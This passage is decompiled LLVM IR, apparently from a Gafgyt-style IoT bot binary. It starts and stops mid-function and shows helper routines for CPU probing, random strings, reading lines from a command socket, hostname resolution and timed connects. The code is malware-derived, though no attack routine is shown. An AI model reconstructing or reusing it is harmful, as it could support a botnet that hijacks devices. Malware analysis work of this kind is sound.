dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  %v2_8048e8b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v2_8048e8b = phi i32 [ %v2_8048e8b.pre, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v0_8048e5a, %entry ]
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  store i32 %v2_8048e8b, i32* @ebp, align 4
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ea1 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058760.18, i32 0, i32 0), i32 0)
  %v2_8048fff = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804901137 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_804901938 = icmp eq i32 %v5_804901137, 0
  %v1_804901b39 = icmp eq i1 %v1_804901938, false
  br i1 %v1_804901b39, label %dec_label_pc_8048eb1.lr.ph, label %dec_label_pc_8049021

dec_label_pc_8048eb1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048eb1

dec_label_pc_8048eb1:                             ; preds = %dec_label_pc_8048eb1.lr.ph, %dec_label_pc_8048fe3
  %v3_8048ebb = call i32 @uppercase(i8* %tmp34)
  %v5_8048ed2 = call i32 @strstr(i32 %v2_8048fff, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805876e.19, i32 0, i32 0))
  %v12_8048ee2 = icmp eq i32 %v5_8048ed2, %v2_8048fff
  %v1_8048ee4 = icmp eq i1 %v12_8048ee2, false
  br i1 %v1_8048ee4, label %dec_label_pc_8048fe3, label %dec_label_pc_8048eea

dec_label_pc_8048eea:                             ; preds = %dec_label_pc_8048eb1
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f04, %dec_label_pc_8048efb
  %v5_8048ef8 = add i32 %v4_8048efb, 1
  %v22_8048ef8 = inttoptr i32 %v5_8048ef8 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048efb:                             ; preds = %dec_label_pc_8048eea, %dec_label_pc_8048ef8
  %storemerge4 = phi i8* [ %v22_8048ef8, %dec_label_pc_8048ef8 ], [ %tmp35, %dec_label_pc_8048eea ]
  %v4_8048efb = ptrtoint i8* %storemerge4 to i32
  %v2_8048efe = load i8, i8* %storemerge4, align 1
  %v7_8048f00 = icmp eq i8 %v2_8048efe, 32
  br i1 %v7_8048f00, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f04

dec_label_pc_8048f04:                             ; preds = %dec_label_pc_8048efb
  %v2_8048f07 = load i8, i8* %storemerge4, align 1
  %v10_8048f09 = icmp eq i8 %v2_8048f07, 9
  br i1 %v10_8048f09, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f0d

dec_label_pc_8048f0d:                             ; preds = %dec_label_pc_8048f04
  %v2_8048f10 = load i8, i8* %storemerge4, align 1
  %v10_8048f12 = icmp eq i8 %v2_8048f10, 58
  br i1 %v10_8048f12, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f3d

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f3d
  %v3_8048f2f = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f36 = add i32 %v4_8048efb, %v3_8048f2f
  %v1_8048f39 = add i32 %v6_8048f36, -1
  %v1_8048f3a = inttoptr i32 %v1_8048f39 to i8*
  store i8 0, i8* %v1_8048f3a, align 1
  br label %dec_label_pc_8048f3d

dec_label_pc_8048f3d:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f18
  %v3_8048f54 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f5b = add i32 %v4_8048efb, %v3_8048f54
  %v1_8048f5e = add i32 %v6_8048f5b, -1
  %v1_8048f5f = inttoptr i32 %v1_8048f5e to i8*
  %v2_8048f5f = load i8, i8* %v1_8048f5f, align 1
  %v10_8048f61 = icmp eq i8 %v2_8048f5f, 13
  br i1 %v10_8048f61, label %dec_label_pc_8048f18, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f3d
  store i1 false, i1* @df, align 1
  store i32 %v4_8048efb, i32* @edi, align 4
  %v3_8048f7c = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f83 = add i32 %v4_8048efb, %v3_8048f7c
  %v1_8048f86 = add i32 %v6_8048f83, -1
  %v1_8048f87 = inttoptr i32 %v1_8048f86 to i8*
  %v2_8048f87 = load i8, i8* %v1_8048f87, align 1
  %v10_8048f89 = icmp eq i8 %v2_8048f87, 10
  br i1 %v10_8048f89, label %dec_label_pc_8048f18, label %dec_label_pc_8048f8d

dec_label_pc_8048f8d:                             ; preds = %dec_label_pc_8048f65
  %v5_8048f96 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8048f9e = icmp eq i32 %v5_8048f96, 0
  br i1 %v1_8048f9e, label %dec_label_pc_8048fb6, label %dec_label_pc_8048fa2

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f8d
  %v5_8048fab = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8048fab = inttoptr i32 %v5_8048fab to i8*
  store i8 0, i8* %v6_8048fab, align 1
  br label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048f8d, %dec_label_pc_8048fa2
  store i32 %v4_8048efb, i32* @eax, align 4
  %v5_8048fc0 = inttoptr i32 %arg1 to i8*
  %v5_8048fc1 = call i32 @strcpy(i8* %v5_8048fc0, i32 %v4_8048efb)
  %v2_8048fcf = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8048fe3:                             ; preds = %dec_label_pc_8048eb1
  %v6_8048ff7 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_8049011 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_8049019 = icmp eq i32 %v5_8049011, 0
  %v1_804901b = icmp eq i1 %v1_8049019, false
  br i1 %v1_804901b, label %dec_label_pc_8048eb1, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_8048fe3, %entry
  %v2_8049027 = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8048fb6, %dec_label_pc_8049021
  %storemerge = phi i32 [ 1, %dec_label_pc_8049021 ], [ 0, %dec_label_pc_8048fb6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048efb, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8048fff, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048ea1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0 }
  uselistorder label %dec_label_pc_8048fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8048f3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048efb, { 1, 0 }
  uselistorder label %dec_label_pc_8048eb1, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_804905e = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058760.18, i32 0, i32 0), i32 0)
  %v2_80490bf = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80490d117 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d918 = icmp eq i32 %v5_80490d117, 0
  %v1_80490db19 = icmp eq i1 %v1_80490d918, false
  br i1 %v1_80490db19, label %dec_label_pc_804906b.lr.ph, label %dec_label_pc_80490dd

dec_label_pc_804906b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804906b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_804906b.lr.ph, %dec_label_pc_804906b
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804906b.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v3_8049075 = call i32 @uppercase(i8* %tmp16)
  %v5_804908c = call i32 @strstr(i32 %v2_80490bf, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805876e.19, i32 0, i32 0))
  %v12_804909c = icmp eq i32 %v5_804908c, %v2_80490bf
  %v4_80490a0 = zext i1 %v12_804909c to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80490a0
  %v6_80490b7 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_80490d1 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d9 = icmp eq i32 %v5_80490d1, 0
  %v1_80490db = icmp eq i1 %v1_80490d9, false
  br i1 %v1_80490db, label %dec_label_pc_804906b, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %dec_label_pc_804906b, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v2_80490e3 = call i32 @__libc_close(i32 %v5_804905e)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_80490bf, { 3, 1, 2, 0 }
  uselistorder i32 %v5_804905e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804906b, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490f0 = load i32, i32* @ebp, align 4
  store i32 %v0_80490f0, i32* %stack_var_-4, align 4
  %v0_80490f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80490f4, i32* %stack_var_-12, align 4
  %v5_804910d = ptrtoint i8* %arg1 to i32
  %v5_804914e21 = icmp sgt i32 %arg2, 0
  br i1 %v5_804914e21, label %dec_label_pc_8049108, label %dec_label_pc_8049150

dec_label_pc_8049108:                             ; preds = %entry, %dec_label_pc_8049108
  %storemerge22 = phi i32 [ %v4_8049145, %dec_label_pc_8049108 ], [ 0, %entry ]
  %v6_804910d = add i32 %storemerge22, %v5_804910d
  store i32 %v6_804910d, i32* @ebx, align 4
  %v1_8049110 = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8049110, i32* @ecx, align 4
  %v2_8049120 = udiv i32 %v1_8049110, 26
  %tmp = mul i32 %v2_8049120, -10
  %v2_8049138 = add i32 %v1_8049110, %tmp
  %v1_8049140 = add i32 %v2_8049138, 65
  %v11_8049140 = trunc i32 %v1_8049140 to i8
  %v2_8049143 = load i32, i32* @ebx, align 4
  %v3_8049143 = inttoptr i32 %v2_8049143 to i8*
  store i8 %v11_8049140, i8* %v3_8049143, align 1
  %v4_8049145 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8049145, %arg2
  br i1 %exitcond, label %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, label %dec_label_pc_8049108

dec_label_pc_8049148.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049108
  %v2_8049153.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8049155.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049150

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, %entry
  %v2_8049155 = phi i32 [ %v2_8049155.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f0, %entry ]
  %v2_8049153 = phi i32 [ %v2_8049153.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049153, i32* @ebx, align 4
  store i32 %v2_8049155, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8049145, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049108, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804915a = load i32, i32* @edi, align 4
  store i32 %v0_804915a, i32* %stack_var_-8, align 4
  %v1_8049167 = inttoptr i32 %tmp19 to i8*
  %v1_804916c = and i32 %tmp19, -256
  store i32 %v1_804916c, i32* %eax.global-to-local, align 4
  %v5_804916e = call i8* @_memset(i8* %v1_8049167, i32 %v1_804916c, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804918e = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049195 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80491a2 = udiv i32 %tmp15, 32
  %v1_80491a8 = urem i32 %tmp15, 32
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_80491ab = load i32, i32* @ebp, align 4
  %v2_80491ab = mul nuw nsw i32 %v2_80491a2, 4
  %v3_80491ab = add nsw i32 %v2_80491ab, -164
  %v4_80491ab = add i32 %v3_80491ab, %v0_80491ab
  %v5_80491ab = inttoptr i32 %v4_80491ab to i32*
  %v6_80491ab = load i32, i32* %v5_80491ab, align 4
  %v9_80491ab = shl i32 1, %v1_80491a8
  %v12_80491ab = or i32 %v6_80491ab, %v9_80491ab
  store i32 %v12_80491ab, i32* %v5_80491ab, align 4
  %v1_80491b6 = add i32 %tmp15, 1
  %v2_80491ba = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_80491d2 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_80491d2, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_80491d2, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049282, label %dec_label_pc_8049278.preheader

dec_label_pc_8049278.preheader:                   ; preds = %entry
  %v7_804927c45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804927c45, label %dec_label_pc_8049282, label %dec_label_pc_80491ec.lr.ph

dec_label_pc_80491ec.lr.ph:                       ; preds = %dec_label_pc_8049278.preheader
  br label %dec_label_pc_80491ec

dec_label_pc_80491ec:                             ; preds = %dec_label_pc_80491ec.lr.ph, %dec_label_pc_8049275
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_80491ec.lr.ph ], [ %v4_8049275, %dec_label_pc_8049275 ]
  %v0_80491ec = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_80491ec, i32* %eax.global-to-local, align 4
  %v3_80491fa = call i32 @HackerPrint(i32 %v0_80491ec, i32 ptrtoint ([5 x i8]* @global_var_8058777.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049227 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_804923d = load i32, i32* @ebp, align 4
  %v4_804923d = add i32 %v3_80491ab, %v0_804923d
  %v5_804923d = inttoptr i32 %v4_804923d to i32*
  %v6_804923d = load i32, i32* %v5_804923d, align 4
  %v12_804923d = or i32 %v6_804923d, %v9_80491ab
  store i32 %v12_804923d, i32* %v5_804923d, align 4
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_8049264 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_8049264, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049264, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049282, label %dec_label_pc_8049275

dec_label_pc_8049275:                             ; preds = %dec_label_pc_80491ec
  %v4_8049275 = add nsw i32 %stack_var_-36.046, 1
  %v7_804927c = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804927c, label %dec_label_pc_8049282, label %dec_label_pc_80491ec

dec_label_pc_8049282:                             ; preds = %dec_label_pc_8049278.preheader, %dec_label_pc_80491ec, %dec_label_pc_8049275, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804929a = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80492dc

dec_label_pc_8049291:                             ; preds = %dec_label_pc_80492dc
  %v0_8049291 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_8049291, i32* %eax.global-to-local, align 4
  %v5_80492a2 = call i32 @__libc_recv(i32 %v0_8049291, i32 %v2_804929a, i32 1, i32 0)
  store i32 %v5_80492a2, i32* %eax.global-to-local, align 4
  %v9_80492aa = icmp eq i32 %v5_80492a2, 1
  br i1 %v9_80492aa, label %dec_label_pc_80492c1, label %dec_label_pc_80492af

dec_label_pc_80492af:                             ; preds = %dec_label_pc_8049291
  %v4_80492af = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_80492af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80492f9

dec_label_pc_80492c1:                             ; preds = %dec_label_pc_8049291
  %v3_80492c1 = load i8, i8* %stack_var_-177, align 1
  %v4_80492c1 = sext i8 %v3_80492c1 to i32
  store i32 %v4_80492c1, i32* %eax.global-to-local, align 4
  %v4_80492c7 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80492c1, i8* %stack_var_-32.0, align 1
  %v5_80492cc = add i32 %v4_80492c7, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v3_80492cf = load i8, i8* %stack_var_-177, align 1
  %v4_80492cf = sext i8 %v3_80492cf to i32
  %v6_80492cf = load i32, i32* %eax.global-to-local, align 4
  %v7_80492cf = and i32 %v6_80492cf, -256
  %v8_80492cf = or i32 %v7_80492cf, %v4_80492cf
  store i32 %v8_80492cf, i32* %eax.global-to-local, align 4
  %v10_80492d5 = icmp eq i8 %v3_80492cf, 10
  br i1 %v10_80492d5, label %dec_label_pc_80492ea, label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492c1
  %v4_80492d9 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80492dc

dec_label_pc_80492dc:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_80492d9
  %v7_80492e0 = phi i32 [ %tmp19, %dec_label_pc_8049282 ], [ %v8_80492cf, %dec_label_pc_80492d9 ]
  %stack_var_-32.0 = phi i8* [ %v1_8049167, %dec_label_pc_8049282 ], [ %v22_80492cc, %dec_label_pc_80492d9 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049282 ], [ %v4_80492d9, %dec_label_pc_80492d9 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049282 ], [ %v4_80492dc, %dec_label_pc_80492d9 ]
  %v4_80492dc = add i32 %stack_var_12.0, -1
  %v9_80492dc = sub i32 0, %stack_var_12.0
  %v10_80492dc = and i32 %stack_var_12.0, %v9_80492dc
  %v11_80492dc = icmp slt i32 %v10_80492dc, 0
  %v12_80492dc = icmp eq i32 %v4_80492dc, 0
  %v13_80492dc = icmp slt i32 %v4_80492dc, 0
  %v3_80492e0 = icmp eq i1 %v13_80492dc, %v11_80492dc
  %v4_80492e0 = icmp eq i1 %v12_80492dc, false
  %v5_80492e0 = and i1 %v4_80492e0, %v3_80492e0
  %v6_80492e0 = zext i1 %v5_80492e0 to i32
  %v8_80492e0 = and i32 %v7_80492e0, -256
  %v9_80492e0 = or i32 %v6_80492e0, %v8_80492e0
  store i32 %v9_80492e0, i32* %eax.global-to-local, align 4
  %v4_80492e6 = icmp eq i1 %v5_80492e0, false
  %v1_80492e8 = icmp eq i1 %v4_80492e6, false
  br i1 %v1_80492e8, label %dec_label_pc_8049291, label %dec_label_pc_80492ea

dec_label_pc_80492ea:                             ; preds = %dec_label_pc_80492c1, %dec_label_pc_80492dc
  %stack_var_-32.1 = phi i8* [ %v22_80492cc, %dec_label_pc_80492c1 ], [ %stack_var_-32.0, %dec_label_pc_80492dc ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80492f9

dec_label_pc_80492f9:                             ; preds = %dec_label_pc_80492af, %dec_label_pc_80492ea
  %storemerge = phi i32 [ -1, %dec_label_pc_80492af ], [ %stack_var_-28.0, %dec_label_pc_80492ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80492ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80492ff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80492dc, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v1_80491a8, { 2, 1, 0 }
  uselistorder i32 %v2_804918e, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_80492f9, { 1, 0 }
  uselistorder label %dec_label_pc_80492ea, { 1, 0 }
  uselistorder label %dec_label_pc_80492dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049282, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80491ec, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8049310 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804931b = icmp eq i32 %v2_8049310, 0
  %v1_804931f = icmp eq i1 %v4_804931b, false
  br i1 %v1_804931f, label %dec_label_pc_804933a, label %dec_label_pc_8049321

dec_label_pc_8049321:                             ; preds = %entry
  %v3_8049329 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805877c.22, i32 0, i32 0))
  br label %dec_label_pc_8049390

dec_label_pc_804933a:                             ; preds = %entry
  %v1_804933d = add i32 %v2_8049310, 16
  %v2_804933d = inttoptr i32 %v1_804933d to i32*
  %v3_804933d = load i32, i32* %v2_804933d, align 4
  %v1_8049353 = inttoptr i32 %v3_804933d to i32*
  %v2_8049353 = load i32, i32* %v1_8049353, align 4
  %v1_8049355 = icmp eq i32 %v2_8049353, 0
  br i1 %v1_8049355, label %dec_label_pc_8049390, label %dec_label_pc_8049359

dec_label_pc_8049359:                             ; preds = %dec_label_pc_804933a
  %v2_8049362 = load i32, i32* %v1_8049353, align 4
  %v1_8049367 = inttoptr i32 %v2_8049362 to i32*
  %v2_8049367 = load i32, i32* %v1_8049367, align 4
  %v2_8049369 = call i32 @__GI_inet_ntoa(i32 %v2_8049367)
  store i32 %v2_8049369, i32* @eax, align 4
  %v8_8049375 = inttoptr i32 %arg2 to i8*
  %v4_8049378 = call i32 @strcpy(i8* %v8_8049375, i32 %v2_8049369)
  br label %dec_label_pc_8049390

dec_label_pc_8049390:                             ; preds = %dec_label_pc_804933a, %dec_label_pc_8049359, %dec_label_pc_8049321
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8049359 ], [ 1, %dec_label_pc_8049321 ], [ 1, %dec_label_pc_804933a ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder label %dec_label_pc_8049390, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8049398 = load i32, i32* @edi, align 4
  %v3_80493a9 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80493b4 = or i32 %v3_80493a9, 2048
  %v3_80493c6 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80493b4)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80493d7 = urem i32 %arg3, 65536
  %v1_80493e0 = call i32 @htons(i32 %v1_80493d7)
  store i32 %arg2, i32* @edx, align 4
  %v3_80493fa = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049402 = icmp eq i32 %v3_80493fa, 0
  br i1 %v1_8049402, label %dec_label_pc_8049415, label %dec_label_pc_8049406

dec_label_pc_8049406:                             ; preds = %entry
  br label %dec_label_pc_8049552

dec_label_pc_8049415:                             ; preds = %entry
  %v2_80493f2 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049434 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80493f2, i32 16)
  %v5_804943f = icmp slt i32 %v3_8049434, 0
  %v1_8049443 = icmp eq i1 %v5_804943f, false
  br i1 %v1_8049443, label %dec_label_pc_8049519, label %dec_label_pc_8049449

dec_label_pc_8049449:                             ; preds = %dec_label_pc_8049415
  %v1_8049449 = call i32 @__errno_location(i32 %v3_8049434)
  %v1_804944e = inttoptr i32 %v1_8049449 to i32*
  %v2_804944e = load i32, i32* %v1_804944e, align 4
  %v9_8049450 = icmp eq i32 %v2_804944e, 115
  %v1_8049453 = icmp eq i1 %v9_8049450, false
  br i1 %v1_8049453, label %dec_label_pc_804950d, label %dec_label_pc_8049459

dec_label_pc_8049459:                             ; preds = %dec_label_pc_8049449
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049476 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049476, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804947d = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804948a = udiv i32 %arg1, 32
  %v1_8049490 = urem i32 %arg1, 32
  %v0_8049493 = load i32, i32* @ebp, align 4
  %v2_8049493 = mul nuw nsw i32 %v2_804948a, 4
  %v3_8049493 = add nsw i32 %v2_8049493, -164
  %v4_8049493 = add i32 %v3_8049493, %v0_8049493
  %v5_8049493 = inttoptr i32 %v4_8049493 to i32*
  %v6_8049493 = load i32, i32* %v5_8049493, align 4
  %v9_8049493 = shl i32 1, %v1_8049490
  %v12_8049493 = or i32 %v6_8049493, %v9_8049493
  store i32 %v12_8049493, i32* %v5_8049493, align 4
  %v1_804949e = add i32 %arg1, 1
  %v2_80494a2 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80494b5 = call i32 @__libc_select(i32 %v1_804949e, i32 0, i32 %v2_8049476, i32 0, i32 %v2_80494a2)
  %tmp33 = icmp slt i32 %v5_80494b5, 1
  br i1 %tmp33, label %dec_label_pc_8049501, label %dec_label_pc_80494c1

dec_label_pc_80494c1:                             ; preds = %dec_label_pc_8049459
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80494ce = ptrtoint i32* %stack_var_-180 to i32
  %v2_80494d5 = ptrtoint i32* %stack_var_-184 to i32
